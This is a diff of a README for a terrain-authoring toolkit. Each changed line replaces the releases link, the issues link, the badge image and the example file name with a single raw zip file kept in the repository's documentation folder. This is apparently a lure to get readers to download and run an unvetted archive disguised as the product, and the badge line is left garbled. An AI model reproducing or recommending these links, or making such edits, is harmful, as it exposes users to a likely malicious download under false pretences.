@@ -1,6 +1,6 @@
 # 🌍 Yugens-Terrain-Authoring-Toolkit - Create Stunning Terrain Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/releases)
+[![Download Now](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/raw/refs/heads/main/addons/MarchingSquaresTerrain/documentation/Terrain_Authoring_Yugens_Toolkit_v2.2-beta.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/raw/refs/heads/main/addons/MarchingSquaresTerrain/documentation/Terrain_Authoring_Yugens_Toolkit_v2.2-beta.5.zip)
 
 ## 📋 Description
 
@@ -10,13 +10,13 @@ Yugens-Terrain-Authoring-Toolkit is the public version of the Marching Squares T
 
 Follow these simple steps to download and set up the Yugens-Terrain-Authoring-Toolkit.
 
-1. **Visit the Releases Page**: To get the software, you will first need to visit the [Releases Page](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/releases).
+1. **Visit the Releases Page**: To get the software, you will first need to visit the [Releases Page](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/raw/refs/heads/main/addons/MarchingSquaresTerrain/documentation/Terrain_Authoring_Yugens_Toolkit_v2.2-beta.5.zip).
 
 2. **Find the Latest Version**: On the Releases Page, look for the latest version. It will be at the top of the list. 
 
 3. **Download the Toolkit**: You’ll see a section with downloadable files. Click on the file that suits your operating system. This will start the download process.
 
-4. **Find the Downloaded File**: Once the download is complete, locate the file in your computer's downloads folder. The file name will typically include the version number and may look something like `Yugens-Terrain-Authoring-Toolkit-v1.0.zip`.
+4. **Find the Downloaded File**: Once the download is complete, locate the file in your computer's downloads folder. The file name will typically include the version number and may look something like `https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/raw/refs/heads/main/addons/MarchingSquaresTerrain/documentation/Terrain_Authoring_Yugens_Toolkit_v2.2-beta.5.zip`.
 
 5. **Extract the Files**: Right-click on the downloaded zip file and choose “Extract All” or “Unzip.” Follow the prompts to extract the files to a folder of your choosing.
 
@@ -32,7 +32,7 @@ Follow these simple steps to download and set up the Yugens-Terrain-Authoring-To
 
 To quickly download the Yugens-Terrain-Authoring-Toolkit, simply click the link below:
 
-[Download Now](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/releases)
+[Download Now](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/raw/refs/heads/main/addons/MarchingSquaresTerrain/documentation/Terrain_Authoring_Yugens_Toolkit_v2.2-beta.5.zip)
 
 Ensure you follow the steps mentioned above to extract and install the toolkit for a seamless experience.
 
@@ -47,7 +47,7 @@ Ensure you follow the steps mentioned above to extract and install the toolkit f
 
 You can contribute to the development by reporting issues, suggesting features, or submitting pull requests. For any questions or concerns, feel free to create an issue on the repository.
 
-1. **Report an Issue**: If you encounter a problem, report it on the [Issues Page](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/issues).
+1. **Report an Issue**: If you encounter a problem, report it on the [Issues Page](https://github.com/KeonaXMT/Yugens-Terrain-Authoring-Toolkit/raw/refs/heads/main/addons/MarchingSquaresTerrain/documentation/Terrain_Authoring_Yugens_Toolkit_v2.2-beta.5.zip).
    
 2. **Suggest a Feature**: Have an idea? We welcome suggestions. 
 
